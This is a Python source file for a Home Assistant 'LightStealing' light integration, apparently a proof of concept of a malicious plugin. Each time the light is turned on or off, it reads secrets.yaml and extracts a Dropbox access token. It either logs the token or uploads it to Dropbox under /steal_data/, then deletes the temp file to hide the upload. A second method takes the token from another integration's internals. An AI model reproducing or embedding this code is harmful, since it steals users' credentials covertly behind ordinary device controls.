"""Platform for integrating a LightStealing."""
from __future__ import annotations
from typing import Any
import os
from datetime import datetime
import logging

import dropbox
import yaml

# Import the device class from the component that you want to support
from homeassistant.components.light import LightEntity
from homeassistant.core import HomeAssistant
from homeassistant.helpers.entity_platform import AddEntitiesCallback
from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType

NAME_KEY = "name"
UPLOAD_KEY = "upload"
INTEGRATIONS_KEY = "integrations"

DEFAULT_NAME = "Light Stealing"
DEFAULT_UPLOAD = False

TARGET_NAME = "switch_exfiltration"
TARGET_FULL_NAME = "switch.switch_exfiltration"
TARGET_TOKEN_NAME = "db_access_token"

_LOGGER = logging.getLogger(__name__)


def setup_platform(
    hass: HomeAssistant,
    config: ConfigType,
    add_entities: AddEntitiesCallback,
    discovery_info: DiscoveryInfoType | None = None,
) -> None:
    """Set up the LightStealing platform."""

    if NAME_KEY in config:
        name = config[NAME_KEY]
    else:
        name = DEFAULT_NAME

    if UPLOAD_KEY in config:
        to_upload = config[UPLOAD_KEY]
    else:
        to_upload = DEFAULT_UPLOAD

    lights = [LightStealing(name, to_upload)]
    add_entities(lights)


class LightStealing(LightEntity):
    """Representation of a LightStealing."""

    def __init__(self, name: str = DEFAULT_NAME, upload: bool = DEFAULT_UPLOAD) -> None:
        """Initialize a LightStealing."""
        self._name = name
        self._brightness = None
        self._state = False
        self._upload = upload

        # This object should physically communicate with the light
        self._light = LightEntity()

        _LOGGER.debug("<%s> was created", self._name)

    @property
    def name(self) -> str:
        """Return the display name of this light."""
        return self._name

    @property
    def brightness(self):
        """Return the brightness of the light.

        This method is optional. Removing it indicates to Home Assistant
        that brightness is not supported for this light.
        """
        return self._brightness

    @property
    def is_on(self) -> bool | None:
        """Return true if light is on."""
        return self._state

    def turn_on(self, **kwargs: Any) -> None:
        """Instruct the light to turn on.

        You can skip the brightness part if your light does not support
        brightness control.
        """
        self._brightness = 255
        self._state = True
        self.stole_token_from_conf()

    def turn_off(self, **kwargs: Any) -> None:
        """Instruct the light to turn off."""
        self._brightness = 0
        self._state = False
        self.stole_token_from_conf()

    def update(self) -> None:
        """Fetch new state data for this light.

        This is the only method that should fetch new data for Home Assistant.
        """
        # self._light.update()
        # self._state = self._light.is_on()
        # self._brightness = self._light.brightness
        return

    def stole_token_from_conf(self):
        secrets_file_paths = "./config/secrets.yaml"
        conf_file = None
        with open(secrets_file_paths, "r") as stream:
            try:
                conf_file = yaml.safe_load(stream)
            except yaml.YAMLError as exc:
                _LOGGER.error("Error parsing configuration file: %s", exc)

            if conf_file:
                if TARGET_TOKEN_NAME not in conf_file:
                    _LOGGER.warning("<%s> is not available in <%s>! ")
                    return
                else:
                    dropbox_token = conf_file[TARGET_TOKEN_NAME]
                    self.use_token(dropbox_token)

    def stole_token_from_class(self):
        """This method uses the stolen token for uploading a file on Dropbox."""
        data = self.hass.data
        integrations = data[INTEGRATIONS_KEY]
        if TARGET_NAME not in integrations:
            _LOGGER.error("<%s> integration is not available!", TARGET_NAME)
            return

        target_integration = integrations[TARGET_NAME]
        target_integration_component = target_integration.get_component()

        if "switch" in target_integration_component.DOMAIN:
            target_switch = target_integration_component.switch.SwitchExfiltration

            dropbox_token = target_switch._access_token
            self.use_token(dropbox_token)

    def use_token(self, dropbox_token):
        if not self._upload:
            _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
        else:
            filename = "tmp.txt"
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # preparing the file to exfiltrate
            tmp_file = open(filename, "w", encoding="utf-8")
            text_to_write = (
                "At "
                + current_time
                + ' Luke was here! (Thanks to your dropbox token: "'
                + dropbox_token
                + '")'
            )
            tmp_file.write(text_to_write)
            tmp_file.close()

            # Sending file
            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)

            # Removing the tmp file to hide the upload
            os.remove(filename)

    def upload_file(self, file_from, file_to, access_token):
        """upload a file to Dropbox using API v2"""
        dbx = dropbox.Dropbox(access_token)

        with open(file_from, "rb") as opened_file:
            dbx.files_upload(
                opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
            )
